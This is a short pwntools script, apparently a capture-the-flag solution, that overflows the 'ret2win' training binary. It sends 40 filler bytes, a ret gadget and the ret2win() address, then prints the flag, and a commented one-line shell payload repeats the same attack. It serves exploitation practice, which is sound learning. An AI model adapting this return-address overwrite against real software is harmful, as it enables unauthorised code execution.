###############
#  Example 1  #
###############  
from pwn import *

elf = context.binary = ELF('ret2win')

p = process(elf.path)

#Prepare the payload
payload = b"A"*40
payload += p64(0x40053e) #ret address ROP chain. Necessary because we are in Ubuntu 20.04 64bits
payload += p64(elf.symbols.ret2win) #address to ret2win() function

# Send the payload
p.sendline(payload) #send our payload to the process

response = p.recvall()
responseFinal = ""
for i in response:
    responseFinal += chr(i)

listResults = responseFinal.split('\n')
print("And the flag is:", listResults[len(listResults)-2])
#print(re.search("(ROPE{.*?})",response.decode()))

#One line, command line solution:
#python3 -c 'print("A"*40 + "\x3e\x05\x40\x00\x00\x00\x00\x00" + "\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win
